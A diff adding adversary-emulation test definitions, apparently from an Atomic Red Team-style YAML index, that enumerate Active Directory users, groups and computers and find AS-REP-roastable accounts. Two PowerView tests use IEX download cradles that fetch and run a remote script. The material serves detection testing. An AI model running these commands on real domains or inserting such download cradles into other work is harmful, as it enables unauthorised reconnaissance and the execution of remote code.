@@ -341,6 +341,20 @@ credential-access:
 '
         name: powershell
         elevation_required: false
+    - name: Get-DomainUser with PowerView
+      auto_generated_guid: d6139549-7b72-4e48-9ea1-324fc9bdf88a
+      description: 'Utilizing PowerView, run Get-DomainUser to identify domain users.
+        Upon execution, progress and info about users within the domain being scanned
+        will be displayed.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
+        name: powershell
   T1552.003:
     technique:
       external_references:
@@ -55087,6 +55101,18 @@ discovery:
           -Server #{domain}
 
 '
+    - name: Enumerate Active Directory Users with ADSISearcher
+      auto_generated_guid: 02e8be5a-3065-4e54-8cc8-a14d138834d3
+      description: |
+        The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.
+        Upon successful execution a listing of users will output with their paths in AD.
+        Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: ([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()
   T1069.002:
     technique:
       external_references:
@@ -55280,6 +55306,71 @@ discovery:
       executor:
         command: "#{adfind_path} -f (objectcategory=group)\n"
         name: command_prompt
+    - name: Enumerate Active Directory Groups with ADSISearcher
+      auto_generated_guid: 9f4e344b-8434-41b3-85b1-d38f29d148d0
+      description: |
+        The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.
+        Upon successful execution a listing of groups will output with their paths in AD.
+        Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: '([adsisearcher]"objectcategory=group").FindAll(); ([adsisearcher]"objectcategory=group").FindOne()
+
+'
+    - name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)
+      auto_generated_guid: 43fa81fb-34bb-4b5f-867b-03c7dbe0e3d8
+      description: |
+        When successful, accounts that do not require kerberos pre-auth will be returned.
+        Reference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined.
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually.
+
+'
+      - description: 'Requires the Active Directory module for powershell to be installed.
+
+'
+        prereq_command: 'if(Get-Module -ListAvailable -Name ActiveDirectory) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+
+'
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'Get-ADUser -Filter ''useraccountcontrol -band 4194304'' -Properties
+          useraccountcontrol | Format-Table name
+
+'
+    - name: Get-DomainGroupMember with PowerView
+      auto_generated_guid: 46352f40-f283-4fe5-b56d-d9a71750e145
+      description: 'Utilizing PowerView, run Get-DomainGroupMember to identify domain
+        users. Upon execution, progress and info about groups within the domain being
+        scanned will be displayed.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember "Domain Admins"
+        name: powershell
   T1482:
     technique:
       external_references:
@@ -57521,6 +57612,18 @@ discovery:
             Write-Host $Computer}
         name: powershell
         elevation_required: false
+    - name: Enumerate Active Directory Computers with ADSISearcher
+      auto_generated_guid: 64ede6ac-b57a-41c2-a7d1-32c6cd35397d
+      description: |
+        The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.
+        Upon successful execution a listing of computers will output with their paths in AD.
+        Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: ([adsisearcher]"objectcategory=computer").FindAll(); ([adsisearcher]"objectcategory=computer").FindOne()
   T1518.001:
     technique:
       id: attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384
